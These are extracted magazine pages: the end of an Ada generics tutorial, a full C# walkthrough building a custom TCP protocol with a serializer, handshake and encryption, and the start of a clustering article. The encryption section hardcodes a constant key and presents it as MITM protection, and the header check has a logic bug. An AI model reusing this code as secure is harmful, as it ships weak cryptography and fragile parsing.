                        в заголов ке процедуры: Not_My_Fault : ex‐
                   ception;.


После того как ввод от пользовате ля получен, остается только применить
нашу функцию Square к каждому значению и вывести результаты. Для этого
мы используем цикл с параметром. С помощью атрибута нашего массива
Input'Range мы можем это сделать с не меньшим удобством, чем предос‐
тавляют ите рато ры в объ ектно ориенти рованных языках, — этот атрибут воз‐
вращает диапа зон индексов.
  Поскольку наш тип Small_Float ограничен, исключение Constraint_Er‐
ror может воз никнуть и при возведении зна чений в квад рат, если они выйдут
за гра ницы диапазона, поэтому мы обра батываем их ана логичным образом
в конце блока declare, в этот раз уже без объявления каких‐либо перемен‐
ных в его заголовке перед begin.
  Выражение Float_IO.Put (Square (Input(I)), Exp => 0, Fore =>
4, Aft => 2), очевидно, вызыва ет функцию для вывода значений с пла‐
вающей точкой. Аргументы Exp, Fore и Aft — это чис ло знаков экспоненты,
число знаков до точки и число знаков после точки соответс твенно.
  По умолчанию использует ся научный фор мат вывода в стиле 1.2E2,
но уста нов ка параметра Exp в ноль отключает это. Интересный момент: в аде
любые параметры функций и процедур можно использовать как именован‐
ные. К примеру, нашу функцию Square мы могли бы вызывать с помощью
Square (X => Input(I)).
   Если порядок фак тичес ких параметров в вызове совпадает с поряд ком
формальных параметров функции, то имена можно не указывать, но в
Float_IO.Put мы использовали именованные параметры, чтобы поменять
порядок, — вызов без именованных парамет ров выглядел бы так: Float_IO.
Put (Square (X => Input(I)), 4, 2, 0).


МОДУЛИ И ОБОБЩЕННОЕ ПРОГРАММИРОВАНИЕ
Обоб щенное программирова ние
Мы  начнем  с простей шего примера обоб щенного  программирования,
потому что оно не ограничивается модулями — обобщенны ми могут быть
и отдельные процеду ры и функции. Мы напишем функцию Do_Nothing,
которая прос то воз вра щает переданное ей значение в неизменном виде
и может быть специализирована для любого типа.


with Ada.Text_IO; use Ada.Text_IO;
procedure Simple_Generic is
    generic
  type T is private;
    function Do_Nothing (X : T) return T;
    function Do_Nothing (X : T) return T is
    begin
  return X;
    end Do_Nothing;
    function Do_Nothing_To_Integer is new Do_Nothing (Integer);
begin
    Put_Line (Integer'Image (Do_Nothing_To_Integer (65535)));
end Simple_Generic;

Как видно, обоб щенные конс трукции создаются с помощью ключевого слова
generic, у которого есть раздел объявлений типов. Тип T в данном случае —
это тип‐параметр, для которого наша процедура может быть специализиро‐
вана. Затем мы описываем нашу фун кцию с использованием типа T. В func‐
tion Do_Nothing_To_Integer is new  Do_Nothing  (Integer) она спе‐
циализиру ется для типа Integer. Мы уже видели это ранее, когда подклю‐
чали обобщенные пакеты из стандартной библиотеки.
  Ключевое слово new, в отли чие от многих других языков, здесь не имеет
никакого отно шения к объектам — объектов в традиционном понимании
в аде нет, хотя инкапсуляция, наследование и полиморфизм есть, просто они
в значительной степени отделены друг от друга и реализуются другими спо‐
собами.


Мо дули
Модули, или пакеты, — встроенная и очень важная часть язы ка. Модули раз‐
делены на интерфейс и реали зацию на уров не языка. Интерфейсы модулей
хранятся в фай лах с рас ширением .ads, а реализации — в файлах с рас‐
ширением .adb.
  Для демонс тра ции мы напишем модуль для работы с условной базой дан‐
ных пользователей. У каж дой учетной записи будут идентификатор, имя поль‐
зователя (строка до 255 символов) и флаг блокировки. Мы сделаем модуль
обобщенным, чтобы в качес тве иден тификатора мож но было использовать
значения разных типов.
  Кроме того, мы сделаем работу с типом учетных записей только через
функции самого модуля.
   Рассмотрим интерфейс нашего модуля, файл accounts.ads.


generic
    type Identifier_T is private;
package Accounts is
    type User_Record is private;
    function Create (Identifier : Identifier_T; Name : String) return
 User_Record;
    procedure Disable (User : in out User_Record);
private
    type User_Record is record
        Identifier : Identifier_T;
        Name     : String (1..255);
        Disabled   : Boolean;
    end record;
end Accounts;

С помощью сло ва generic мы делаем его обоб щенным, с типом‐параметром
Identifier_T. Пос ле слов package Accounts is идут опи сания публичных
полей модуля, которые будут доступны при его импорте, а после ключевого
слова private — описания закрытых полей.
  Можно заметить, что тип User_Record описан дважды: первый раз в пуб‐
личной час ти модуля как type User_Record is private и второй раз в его
закрытой части как настоящий тип‐запись. И вот почему: первое описание
говорит, что тип User_Record — абстрактный и за пре делами модуля будет
известно только его имя, но не детали реали зации. Это сделает невоз‐
можным прямой доступ к полям нашей записи для любых функций, которые
не принадлежат модулю.
  Более того, даже если мы знаем, как на самом деле устроен тип, создать
значения типа Accounts.User_Record можно будет толь ко с помощью фун‐
кции  Accounts.Create. Любые  другие  значения  будут  несовместимы
с остальными функциями из него. Так реали зуется инкапсуляция. Если бы мы
включили  описание  типа  в  секцию  private,  но  не  включили  type
User_Record is private в публичную часть, этот тип был бы вов се не виден
за пределами модуля и воспользоваться им было бы невозможно.
  Реализацию мы сде лаем тривиальной, вот файл accounts.adb:


package body Accounts is
function Create (Identifier : Identifier_T; Name : String) return
User_Record is
begin
     return (Identifier, Name, False);
end Create;
procedure Disable (User : in out User_Record) is
begin
    User.Disabled := True;
end;
end Accounts;

В завершение приведем простейшую программу с использованием нашего
модуля, файл user_test.adb. Для сбор ки проекта дос таточ но положить все
три файла в один каталог и выполнить команду gnatmake user_test.adb.


with Accounts;
procedure User_Test is
    package My_Accounts is new Accounts(Integer);
    User : My_Accounts.User_Record;
begin
    User := My_Accounts.Create (0, "root");
end User_Test;


ЗАКЛЮЧЕНИЕ
Многие возможности язы ка остались за кад ром, такие как наследование
с помощью расширений типов или многозадачность. Заинтересован ные
читатели могут продол жить изучение языка по курсам ком пании AdaCore
или вики‐кни ге.
  Конечно, многие языки хорошо выглядят только на бумаге, но любые
попытки их исполь зования разбиваются о суровую реаль ность. В следующий
раз мы рассмот рим историю создания небольшого про екта с открытым
исходным кодом и ознакомимся с использовани ем ады на практике.
КОДИНГ





                                       0x25CBFC4F
                                            9310d27e@gmail.com
ПРОТОКОЛ
    СВОИМИ РУКАМИ



    СОЗДАЕМ С НУЛЯ TCP‐ПРОТОКОЛ
       И ПИШЕМ СЕРВЕР НА C#





Ты в жиз ни не раз сталкивал ся с разными протоколами —
одни исполь зовал, другие, возможно, реверсил. Одни были
легко читаемы, в дру гих без hex‐редактора не разоб раться.
В этой статье я покажу, как соз дать свой собствен ный про‐
токол, который будет работать поверх TCP/IP. Мы разработа‐
ем свою структуру данных и реализуем сервер на C#.


Итак, про токол передачи данных — это соглашение между при ложениями
о том, как должны выглядеть переда ваемые данные. Например, сервер и кли‐
ент могут использовать WebSocket в связке с JSON. Вот так приложение
на Android мог ло бы запросить погоду с сервера:


{
    "request": "getWeather",
    "city": "cityname"
}

И сервер мог бы ответить:


{
    "success": true,
    "weatherHumanReadable": "Warm",
    "degrees": 18
}

Пропарсив ответ по известной модели, приложение предос тавит информа‐
цию пользователю. Выпол нить парсинг такого пакета мож но, только рас‐
полагая информацией о его строении. Если ее нет, протокол при дется
реверсить.


СОЗДАЕМ БАЗОВУЮ СТРУКТУРУ ПРОТОКОЛА
Этот про токол будет базовым для простоты. Но мы будем вести его раз‐
работку с рас четом на то, что впоследс твии его рас ширим и усложним.
  Первое, что необходимо ввести, — это наш собственный заголовок, чтобы
приложения могли отличать пакеты нашего протокола. У нас это будет набор
байтов 0xAF, 0xAA, 0xAF. Именно они и будут стоять в начале каждого сооб‐
щения.


             INFO

                      Почти каждый бинар ный протокол имеет свое
                       «магичес кое число» (также «заголо вок» и «сиг‐
                         натура») — набор байтов в начале пакета. Оно
                       используется для идентификации пакетов своего
                      протокола. Остальные пакеты будут игнориро‐
                         ваться.


Каждый пакет будет иметь тип и подтип и будет размером в байт. Так мы смо‐
жем создать 65 025 (255 * 255) разных типов пакетов. Пакет будет содержать
в себе поля, каж дое со своим уникальным номером, тоже размером в один
байт. Это предос тавит возможность иметь 255 полей в одном пакете. Чтобы
удостовериться в  том,  что пакет дошел до приложения полностью  (и
для удобства парсинга), добавим байты, которые будут сигнализи ровать
о конце пакета.
  Завершенная структура пакета:



  XPROTOCOL PACKET STRUCTURE

  (offset: 0) HEADER (3 bytes) [ 0xAF, 0xAA, 0xAF ]
  (offset: 3) PACKET ID
    (offset: 3) PACKET TYPE (1 byte)
    (offset: 4) PACKET SUBTYPE (1 byte)
  (offset: 5) FIELDS (FIELD[])
  (offset: END) PACKET ENDING (2 bytes) [ 0xFF, 0x00 ]


  FIELD STRUCTURE


  (offset: 0) FIELD ID (1 byte)
  (offset: 1) FIELD SIZE (1 byte)
  (offset: 2) FIELD CONTENTS


Назовем наш про токол, как ты мог заметить, XProtocol. На третьем сдвиге
начина ется информация о  типе  пакета. На пятом начинается массив
из полей. Завершающим звеном будут байты 0xFF и 0x00, зак рывающие
пакет.


ПИШЕМ КЛИЕНТ И СЕРВЕР
Для начала нужно ввести основные свойства, которые будет иметь пакет:
 • тип пакета;
 • подтип;
 • набор полей.


public class XPacket
{
    public byte PacketType { get; private set; }
    public byte PacketSubtype { get; private set; }
    public List<XPacketField> Fields { get; set; } = new List<XPacke
tField>();
}

Добавим класс для опи сания поля пакета, в котором будут его данные, ID
и размер.


public class XPacketField
{
    public byte FieldID { get; set; }
    public byte FieldSize { get; set; }
    public byte[] Contents { get; set; }
}

Сделаем обычный конструктор приватным и создадим ста тический метод
для получения нового экземпляра объ екта.


private XPacket() {}
public static XPacket Create(byte type, byte subtype)
{
    return new XPacket
    {
        PacketType = type,
        PacketSubtype = subtype
    };
}

Теперь можно задать тип пакета и поля, которые будут внутри него. Создадим
функцию для этого. Записывать будем в поток MemoryStream. Первым делом
запишем бай ты заголовка, типа и подтипа пакета, а потом отсортируем поля
по возрастанию FieldID.


public byte[] ToPacket()
{
    var packet = new MemoryStream();
    packet.Write(
    new byte[] {0xAF, 0xAA, 0xAF, PacketType, PacketSubtype}, 0, 5);
    var fields = Fields.OrderBy(field => field.FieldID);
    foreach (var field in fields)
    {
        packet.Write(new[] {field.FieldID, field.FieldSize}, 0, 2);
        packet.Write(field.Contents, 0, field.Contents.Length);
    }
    packet.Write(new byte[] {0xFF, 0x00}, 0, 2);
    return packet.ToArray();
}

Теперь запишем все поля. Сначала пой дет ID поля, его размер и данные.
И только потом конец пакета — 0xFF, 0x00.
   Теперь пора научиться парсить пакеты.


             INFO

                  Минимальный  раз мер   пакета  —  7   байт:
                   HEADER(3) + TYPE(1) + SUBTYPE(1) + PACKET
                   ENDING(2)


Проверяем размер входного пакета, его заголо вок и два последних байта.
После валидации пакета получим его тип и подтип.


public static XPacket Parse(byte[] packet)
{
    if (packet.Length < 7)
    {
        return null;
    }
    if (packet[0] != 0xAF ||
        packet[1] != 0xAA ||
        packet[2] != 0xAF)
    {
        return null;
    }
    var mIndex = packet.Length ‐ 1;
    if (packet[mIndex ‐ 1] != 0xFF ||
        packet[mIndex] != 0x00)
    {
        return null;
    }
    var type = packet[3];
    var subtype = packet[4];
    var xpacket = Create(type, subtype);
    /* <‐‐‐> */

Пора перейти к парсингу полей. Так как наш пакет заканчива ется двумя бай‐
тами, мы можем узнать, когда закончились дан ные для парсинга. Получим ID
поля и его размер, добавим к списку. Если пакет будет поврежден и будет
существовать поле с ID, равным нулю, и SIZE, равным нулю, то необходимос‐
ти его пар сить нет.


/* <‐‐‐> */
    var fields = packet.Skip(5).ToArray();
    while (true)
    {
        if (fields.Length == 2)
        {
            return xpacket;
        }
        var id = fields[0];
        var size = fields[1];
        var contents = size != 0 ?
        fields.Skip(2).Take(size).ToArray() : null;
        xpacket.Fields.Add(new XPacketField
        {
            FieldID = id,
            FieldSize = size,
            Contents = contents
        });
        fields = fields.Skip(2 + size).ToArray();
    }
}

У кода выше есть проб лема: если подменить размер одно го из полей, пар‐
синг завершится с необ работанным исключением или пропарсит пакет
неверно. Необ ходимо обеспечить безопасность пакетов. Но об этом речь
пойдет чуть позже.


УЧИМСЯ ЗАПИСЫВАТЬ И СЧИТЫВАТЬ ДАННЫЕ
Из‐за стро ения класса XPacket необходимо хранить бинар ные данные
для полей. Что бы установить значение поля, нам потребуется конвертировать
имеющиеся данные в массив байтов. Язык C# не предоставляет идеальных
способов сделать это, поэтому внутри пакетов будут переда ваться только
базовые типы: int, double, float и так далее. Так как они имеют фик‐
сирован ный размер, можно считать его напрямую из памяти.
   Чтобы получить чистые байты объекта из памяти, иногда используется
метод небезо пас ного кода и указателей, но есть и способы проще: бла года‐
ря клас су Marshal в C# можно взаимодействовать с unmanaged‐областями
нашего приложения. Чтобы перевес ти любой объект фиксированной длины
в байты, мы будем пользоваться такой функцией:


public byte[] FixedObjectToByteArray(object value)
{
    var rawsize = Marshal.SizeOf(value);
    var rawdata = new byte[rawsize];
    var handle = GCHandle.Alloc(rawdata,
        GCHandleType.Pinned);
    Marshal.StructureToPtr(value,
        handle.AddrOfPinnedObject(),
        false);
    handle.Free();
    return rawdata;
}

Здесь мы делаем следующее:
 • получаем размер нашего объекта;
 • создаем массив, в который будет записана вся информа ция;
 • получаем дескриптор на наш массив и записываем в него объект.

Теперь сделаем то же самое, только наоборот.


private T ByteArrayToFixedObject<T>(byte[] bytes) where T: struct
{
    T structure;
    var handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
    try
    {
        structure = (T) Marshal.PtrToStructure(handle.AddrOfPinnedObj
ect(), typeof(T));
    }
    finally
    {
        handle.Free();
    }
    return structure;
}

Только что ты научился превращать объекты в массив байтов и обратно. Сей‐
час можно добавить функции для установки и получения зна чений полей.
Давай соз дадим функцию для простого поис ка поля по его ID.


public XPacketField GetField(byte id)
{
    foreach (var field in Fields)
    {
        if (field.FieldID == id)
        {
            return field;
        }
    }
    return null;
}

Добавим функцию для про верки существования поля.


public bool HasField(byte id)
{
    return GetField(id) != null;
}

Получаем значение из поля.


public T GetValue<T>(byte id) where T : struct
{
    var field = GetField(id);
    if (field == null)
    {
        throw new Exception($"Field with ID {id} wasn't found.");
    }
    var neededSize = Marshal.SizeOf(typeof(T));
    if (field.FieldSize != neededSize)
    {
        throw new Exception($"Can't convert field to type {typeof(T).
FullName}.\n" + $"We have {field.FieldSize} bytes but we need
exactly {neededSize}.");
    }
    return ByteArrayToFixedObject<T>(field.Contents);
}

Добавив несколько про верок и используя уже известную нам функцию, прев‐
ратим набор байтов из поля в нужный нам объект типа T.


Ус танов ка зна чения
Мы можем принять только объекты Value‐Type. Они имеют фиксированный
размер, поэто му мы можем их записать.


public void SetValue(byte id, object structure)
{
    if (!structure.GetType().IsValueType)
    {
        throw new Exception("Only value types are available.");
    }
    var field = GetField(id);
    if (field == null)
    {
        field = new XPacketField
        {
            FieldID = id
        };
        Fields.Add(field);
    }
    var bytes = FixedObjectToByteArray(structure);
    if (bytes.Length > byte.MaxValue)
    {
        throw new Exception("Object is too big. Max length is 255
bytes.");
    }
    field.FieldSize = (byte) bytes.Length;
    field.Contents = bytes;
}


Провер ка на работоспособность
Проверим соз дание пакета, его перевод в бинарный вид и пар синг назад.


var packet = XPacket.Create(1, 0);
packet.SetValue(0, 123);
packet.SetValue(1, 123D);
packet.SetValue(2, 123F);
packet.SetValue(3, false);
var packetBytes = packet.ToPacket();
var parsedPacket = XPacket.Parse(packetBytes);
Console.WriteLine($"int: {parsedPacket.GetValue<int>(0)}\n" +
                  $"double: {parsedPacket.GetValue<double>(1)}\n" +
                  $"float: {parsedPacket.GetValue<float>(2)}\n" +
                  $"bool: {parsedPacket.GetValue<bool>(3)}");

Судя по все му, все работает прекрасно. В консоли должен появиться выхлоп.



  int: 123
  double: 123
  float: 123
  bool: False



ВВОДИМ ТИПЫ ПАКЕТОВ
Запомнить ID всех пакетов, которые будут соз даны, сложно. Отлаживать
пакет с типом N и подтипом Ns не легче, если не дер жать все ID в голове.
В этом разделе мы дадим нашим пакетам име на и при вяжем эти имена к ID
пакета. Для начала создадим перечисление, которое будет содержать имена
пакетов.


public enum XPacketType
{
    Unknown,
    Handshake
}

Unknown  будет  использоваться  для  типа,  который  нам  неизвестен.
Handshake — для пакета рукопожатия.
   Теперь, ког да нам известны типы пакетов, пора при вязать их к ID. Необ‐
ходимо соз дать менеджер, который будет этим занимать ся.


public static class XPacketTypeManager
{
    private static readonly Dictionary<XPacketType, Tuple<byte, byte>
> TypeDictionary = new Dictionary<XPacketType, Tuple<byte, byte>>();
    /* < ... > */
}

Статический класс хорошо подойдет для этой функции. Его конструктор
вызывается лишь один раз, что поз волит нам зарегистрировать все извес‐
тные типы пакетов. Невозможность вызвать статический конс труктор извне
поможет не про ходить повторную регистрацию типов.
   Dictionary<TKey, TValue> хорошо подходит для этой задачи. Исполь‐
зуем тип (XPacketType) как ключ, а Tuple<T1, T2> будет хра нить в себе зна‐
чение типа (T1) и подтипа (T2). Создадим функцию для регистрации типов
пакета.


public static void RegisterType(XPacketType type, byte btype, byte
bsubtype)
{
    if (TypeDictionary.ContainsKey(type))
    {
        throw new Exception($"Packet type {type:G} is already regist
ered.");
    }
    TypeDictionary.Add(type, Tuple.Create(btype, bsubtype));
}

Имплементируем получение информации по типу:


public static Tuple<byte, byte> GetType(XPacketType type)
{
    if (!TypeDictionary.ContainsKey(type))
    {
        throw new Exception($"Packet type {type:G} is not registered.
");
    }
    return TypeDictionary[type];
}

И конечно, получение типа пакета. Струк тура может выглядеть несколь ко
хаотичной, но она будет работать.


public static XPacketType GetTypeFromPacket(XPacket packet)
{
    var type = packet.PacketType;
    var subtype = packet.PacketSubtype;
    foreach (var tuple in TypeDictionary)
    {
        var value = tuple.Value;
        if (value.Item1 == type && value.Item2 == subtype)
        {
            return tuple.Key;
        }
    }
    return XPacketType.Unknown;
}


СОЗДАЕМ СТРУКТУРУ ПАКЕТОВ ДЛЯ ИХ СЕРИАЛИЗАЦИИ И
ДЕСЕРИАЛИЗАЦИИ
Чтобы не парсить все вручную, обра тимся к сериализации и десериализации
классов. Для этого нужно соз дать класс и расставить атрибуты. Все осталь‐
ное код сде лает самостоятельно; потребу ется только атрибут с информацией
о том, с какого поля писать и читать.


[AttributeUsage(AttributeTargets.Field)]
public class XFieldAttribute : Attribute
{
    public byte FieldID { get; }
    public XFieldAttribute(byte fieldId)
    {
        FieldID = fieldId;
    }
}

Используя AttributeUsage, мы установили, что наш атрибут можно будет
установить толь ко на поля классов. FieldID будет использовать ся для хра‐
нения ID поля внутри пакета.


СОЗДАЕМ СЕРИАЛИЗАТОР
Для сериализации и десериализации в C# использует ся Reflection. Этот
набор классов поз волит узнать всю необ ходимую информацию и установить
значение полей во время рантайма.
  Для начала необходимо собрать информа цию о полях, которые будут
участвовать в процессе сериализации. Для этого можно исполь зовать прос‐
тое выражение LINQ.


private static List<Tuple<FieldInfo, byte>> GetFields(Type t)
{
    return t.GetFields(BindingFlags.Instance |
                       BindingFlags.NonPublic |
                       BindingFlags.Public)
    .Where(field => field.GetCustomAttribute<XFieldAttribute>() !=
null)
    .Select(field => Tuple.Create(field, field.GetCustomAttribute<
XFieldAttribute>().FieldID))
    .ToList();
}

Так как необходимые поля помечены атрибутом XFieldAttribute, найти их
внутри клас са не составит труда. Сначала получим все нес татичные, приват‐
ные и публичные поля при помощи GetFields(). Выбираем все поля,
у которых есть наш атрибут. Собираем новый IEnumerable, который содер‐
жит Tuple<FieldInfo, byte>, где byte — ID нашего поля в пакете.


             INFO

                      Здесь мы вызыва ем GetCustomAttribute<>(
                   ) два раза. Это не обя затель но, но таким обра‐
                     зом код будет выглядеть акку ратнее.


Итак, теперь ты умеешь получать все FieldInfo для типа, который будешь
сериализовать. Пришло время создать сам сериали затор: у него будут обыч‐
ный и строгий режимы работы. Во вре мя обыч ного режима будет игнориро‐
ваться тот факт, что разные поля используют один и тот же ID поля внутри
пакета.


public static XPacket Serialize(byte type, byte subtype, object obj,
bool strict = false)
{
    var fields = GetFields(obj.GetType());
    if (strict)
    {
        var usedUp = new List<byte>();
        foreach (var field in fields)
        {
            if (usedUp.Contains(field.Item2))
            {
                throw new Exception("One field used two times.");
            }
            usedUp.Add(field.Item2);
        }
    }
    var packet = XPacket.Create(type, subtype);
    foreach (var field in fields)
    {
        packet.SetValue(field.Item2, field.Item1.GetValue(obj));
    }
    return packet;
}

Внутри foreach про исхо дит самое интересное: fields содержит все нужные
поля в виде Tuple<FieldInfo, byte>. Item1 — искомое поле, Item2 — ID
этого поля внутри пакета. Перебираем их все, следом устанавливаем зна‐
чения полей при помощи SetPacket(byte, object). Теперь пакет сериали‐
зован.


                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ
   ПРОТОКОЛ СВОИМИ
           РУКАМИ
         СОЗДАЕМ С НУЛЯ TCP‐ПРОТОКОЛ И ПИШЕМ
                                 СЕРВЕР НА C#





СОЗДАЕМ ДЕСЕРИАЛИЗАТОР
Создавать десериали затор в разы проще. Нужно использовать функцию Get‐
Fields(), которую мы имплементировали в прошлом разделе.


public static T Deserialize<T>(XPacket packet, bool strict = false)
{
    var fields = GetFields(typeof(T));
    var instance = Activator.CreateInstance<T>();
    if (fields.Count == 0)
    {
        return instance;
    }
    /* <‐‐‐> */

После того как мы подготови ли все к десериали зации, можем приступить
к делу. Выполняем проверки для режима strict, бросая исклю чение, ког да
это нужно.


/* <‐‐‐> */
    foreach (var tuple in fields)
    {
        var field = tuple.Item1;
        var packetFieldId = tuple.Item2;
        if (!packet.HasField(packetFieldId))
        {
            if (strict)
            {
                throw new Exception($"Couldn't get field[{packet
FieldId}] for {field.Name}");
            }
            continue;
        }
        /* Очень важный костыль, который многое упрощает
         * Метод GetValue<T>(byte) принимает тип как type‐параметр
         * Наш же тип внутри field.FieldType
         * Используя Reflection, вызываем метод с нужным
type‐параметром
         */
        var value = typeof(XPacket)
            .GetMethod("GetValue")?
            .MakeGenericMethod(field.FieldType)
            .Invoke(packet, new object[] {packetFieldId});
        if (value == null)
        {
            if (strict)
            {
                throw new Exception($"Couldn't get value for field[{
packetFieldId}] for {field.Name}");
            }
            continue;
        }
        field.SetValue(instance, value);
    }
    return instance;
}

Создание десериализато ра завершено. Теперь можно проверить работос‐
пособность кода. Для начала создадим простой класс.


class TestPacket
{
    [XField(0)]
    public int TestNumber;
    [XField(1)]
    public double TestDouble;
    [XField(2)]
    public bool TestBoolean;
}

Напишем простой тест.


var t = new TestPacket {TestNumber = 12345,
                        TestDouble = 123.45D,
                        TestBoolean = true};
var packet = XPacketConverter.Serialize(0, 0, t);
var tDes = XPacketConverter.Deserialize<TestPacket>(packet);
if (tDes.TestBoolean)
{
    Console.WriteLine($"Number = {tDes.TestNumber}\n" +
                      $"Double = {tDes.TestDouble}");
}

После запуска программы должны отобразиться две строки:



  Number = 12345
  Double = 123,45


А теперь перейдем к тому, для чего все это соз давалось.


ПЕРВОЕ РУКОПОЖАТИЕ
Рукопожатие применяется в протоколах для того, чтобы удос товериться, что
клиент и сервер исполь зуют одинаковый протокол, и проверить соединение.
В данном слу чае рукопожатие позволит проверить, работает ли протокол.


        WWW

                    Примеры работы с сокетами ты найдешь в офи‐
                       циальной документации в главе Socket Code Ex‐
                       amples.


Мы создали простой пакет для обмена рукопо жатиями.


public class XPacketHandshake
{
    [XField(1)]
    public int MagicHandshakeNumber;
}

Рукопожатие будет инициировать клиент. Он отправляет пакет рукопожатия
с рандомным числом, а сервер в свою очередь должен ответить числом,
на 15 меньше полученного.
  Отправляем пакет на сервер.


var rand = new Random();
HandshakeMagic = rand.Next();
client.QueuePacketSend(
        XPacketConverter.Serialize(
            XPacketType.Handshake,
            new XPacketHandshake
            {
                MagicHandshakeNumber = HandshakeMagic
            }).ToPacket());

При получе нии пакета от сервера обрабатываем handshake отдельной фун‐
кцией.


private static void ProcessIncomingPacket(XPacket packet)
{
    var type = XPacketTypeManager.GetTypeFromPacket(packet);
    switch (type)
    {
        case XPacketType.Handshake:
            ProcessHandshake(packet);
            break;
        case XPacketType.Unknown:
            break;
        default:
            throw new ArgumentOutOfRangeException();
    }
}

Десериализуем, про веря ем ответ от сервера.


private static void ProcessHandshake(XPacket packet)
{
    var handshake = XPacketConverter.Deserialize<XPacketHandshake>(
packet);
    if (HandshakeMagic ‐ handshake.MagicHandshakeNumber == 15)
    {
        Console.WriteLine("Handshake successful!");
    }
}

На стороне сер вера есть свой иден тичный ProcessIncomingPacket. Раз‐
берем про цесс обработки пакета на стороне сервера. Десериализуем пакет
рукопожатия от клиента, отнимаем пят надцать, сериализуем и отправляем
обратно.


private void ProcessHandshake(XPacket packet)
{
    Console.WriteLine("Recieved handshake packet.");
    var handshake = XPacketConverter.Deserialize<XPacketHandshake>(
packet);
    handshake.MagicHandshakeNumber ‐= 15;
    Console.WriteLine("Answering..");
    QueuePacketSend(
        XPacketConverter.Serialize(XPacketType.Handshake, handshake)
            .ToPacket());
}

Собираем и про веря ем.





                      Тестирование рукопожатия

Все работа ет! :)


ИМПЛЕМЕНТИРУЕМ ПРОСТУЮ ЗАЩИТУ ПРОТОКОЛА
Наш протокол будет иметь два типа пакетов — обычный и защищенный.
У обычного наш стандартный заголо вок, а у защищенного вот такой: [0x95,
0xAA, 0xFF].
   Чтобы отли чать зашифрованные пакеты от обычных, потребуется добавить
свойство внутрь класса XPacket.


public bool Protected { get; set; }

После модифицируем функцию XPacket.Parse(byte[]), что бы она при‐
нимала и рас шифровыва ла новые пакеты. Сначала модифицируем функцию
проверки заголовка:


var encrypted = false;
if (packet[0] != 0xAF ||
    packet[1] != 0xAA ||
    packet[2] != 0xAF)
{
    if (packet[0] == 0x95 ||
        packet[1] == 0xAA ||
        packet[2] == 0xFF)
    {
        encrypted = true;
    }
    else
    {
        return null;
    }
}

Как будет выглядеть наш зашифрован ный пакет? По сути, это будет пакет
в пакете (вро де пакета с пакетами, который ты прячешь на кухне, только здесь
защищен ный пакет содержит в себе зашифрованный обычный пакет).
   Теперь необходимо расшифровать и распарсить зашифрованный пакет.
Позволяем пометить пакет как продукт расшифровки дру гого пакета.


public static XPacket Parse(byte[] packet, bool markAsEncrypted =
false)

Добавляем функциональность в цикл парсинга полей.


if (fields.Length == 2)
{
    return encrypted ? DecryptPacket(xpacket) : xpacket;
}

Так как мы принима ем только структуры как типы данных, мы не сможем
записать byte[] внутрь поля. Поэтому нем ного модифицируем код, добавив
новую функцию, которая будет принимать массив данных.


public void SetValueRaw(byte id, byte[] rawData)
{
    var field = GetField(id);
    if (field == null)
    {
        field = new XPacketField
        {
            FieldID = id
        };
        Fields.Add(field);
    }
    if (rawData.Length > byte.MaxValue)
    {
        throw new Exception("Object is too big. Max length is 255
bytes.");
    }
    field.FieldSize = (byte) rawData.Length;
    field.Contents = rawData;
}

Сделаем такую же, но уже для получения данных из поля.


public byte[] GetValueRaw(byte id)
{
    var field = GetField(id);
    if (field == null)
    {
        throw new Exception($"Field with ID {id} wasn't found.");
    }
    return field.Contents;
}

Теперь все готово для создания фун кции расшифровки пакета. Шифрование
будет исполь зовать класс RijndaelManaged со строкой в качестве пароля
для шифрования. Строка с паролем будет константна. Это шифрование
поможет защититься от ата ки типа MITM.
  Создадим класс, который будет шифровать и рас шифровывать данные.


        WWW

                        Так  как про цесс шифрования выглядит иден‐
                         тично,  возьмем  готовое  решение  для шиф‐
                       рования строки с Stack Overﬂow и адаптируем его
                       для себя.


Модифицируем методы, чтобы они принимали и воз вра щали массивы бай‐
тов.


public static byte[] Encrypt(byte[] data, string passPhrase)
public static byte[] Decrypt(byte[] data, string passPhrase)

И простой хен длер, который будет хранить секретный ключ.


public class XProtocolEncryptor
{
    private static string Key { get; } = "2e985f930853919313c96d00
1cb5701f";
    public static byte[] Encrypt(byte[] data)
    {
        return RijndaelHandler.Encrypt(data, Key);
    }
    public static byte[] Decrypt(byte[] data)
    {
        return RijndaelHandler.Decrypt(data, Key);
    }
}

Затем создаем функцию для расшифровки. Данные обязательно должны
быть в поле с ID = 0. Как иначе нам его искать?


private static XPacket DecryptPacket(XPacket packet)
{
    if (!packet.HasField(0))
    {
        return null;
    }
    var rawData = packet.GetValueRaw(0);
    var decrypted = XProtocolEncryptor.Decrypt(rawData);
    return Parse(decrypted, true);
}

Получаем данные, расшифровываем и парсим заново. То же самое проделы‐
ваем с обратной процедурой.
  Вводим свойство, чтобы пометить надобность в заголовке зашифрован‐
ного пакета.


private bool ChangeHeaders { get; set; }

Создаем прос той пакет и помечаем, что в нем зашифрованные дан ные.


public static XPacket EncryptPacket(XPacket packet)
{
    if (packet == null)
    {
        return null;
    }
    var rawBytes = packet.ToPacket();
    var encrypted = XProtocolEncryptor.Encrypt(rawBytes);
    var p = Create(0, 0);
    p.SetValueRaw(0, encrypted);
    p.ChangeHeaders = true;
    return p;
}

И добавляем две функции для более удоб ного обращения.


public XPacket Encrypt()
{
    return EncryptPacket(this);
}
public XPacket Decrypt() {
    return DecryptPacket(this);
}

Модифицируем ToPacket(), чтобы тот слушался зна чения ChangeHeaders.


packet.Write(ChangeHeaders
    ? new byte[] {0x95, 0xAA, 0xFF, PacketType, PacketSubtype}
    : new byte[] {0xAF, 0xAA, 0xAF, PacketType, PacketSubtype},
    0, 5);

Проверяем:


var packet = XPacket.Create(0, 0);
packet.SetValue(0, 12345);
var encr = packet.Encrypt().ToPacket();
var decr = XPacket.Parse(encr);
Console.WriteLine(decr.GetValue<int>(0));

В консоли получа ем число 12345.


ЗАКЛЮЧЕНИЕ
Только что мы соз дали свой собственный протокол. Это был долгий путь
от базовой структуры на бумаге до его полной имплементации в коде. Наде‐
юсь, тебе было интересно!
  Исходный код проекта можно найти в моем GitHub.
АДМИН

    COROSYNC
 +
   PACEMAKER

  КАК ПРАВИЛЬНО РАЗВЕРНУТЬ КЛАСТЕР
   ВЫСОКОЙ ОТКАЗОУСТОЙЧИВОСТИ





Сделать так, чтобы сервис тянул большую
нагрузку, — задача, с которой однажды
сталкивается любой сисадмин. И  лучше
всего позабо титься о создании механизма
отказоустойчивости  заранее,  до   того,         Иван Рыжевцев                                                                              Системный администратор с
как важ ные  узлы  сети  нач нут  выходить       Прошедшийбогатымогонь,опытом.воду и
